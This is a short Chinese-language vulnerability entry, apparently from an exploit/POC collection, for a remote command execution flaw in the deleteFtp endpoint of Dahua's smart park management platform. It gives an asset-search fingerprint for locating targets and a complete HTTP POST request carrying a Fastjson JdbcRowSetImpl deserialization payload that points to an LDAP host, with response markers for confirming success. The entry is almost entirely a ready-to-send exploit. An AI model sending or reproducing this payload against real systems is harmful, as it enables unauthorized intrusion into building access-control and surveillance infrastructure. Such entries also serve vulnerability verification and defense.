﻿# 大华智慧园区综合管理平台deleteFtp接口远程命令执行漏洞

> 更新时间：2023-12-07

> 漏洞编号：

> 漏洞说明：大华智慧园区综合管理平台deleteFtp接口存在远程命令执行漏洞。

> 漏洞特征：app="dahua-智慧园区综合管理平台"

> 验证脚本：HTTP

```
POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1
Connection: close
Content-Type: application/json
Accept-Encoding: gzip, deflate, br

{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://www.baidu.com","autoCommit":true}}}
```

> 响应代码特征：200

> 响应内容特征：autoCommit

> 上传文件定位：

> 验证文件来源：大华智慧园区综合管理平台deleteFtp接口远程命令执行漏洞.poc
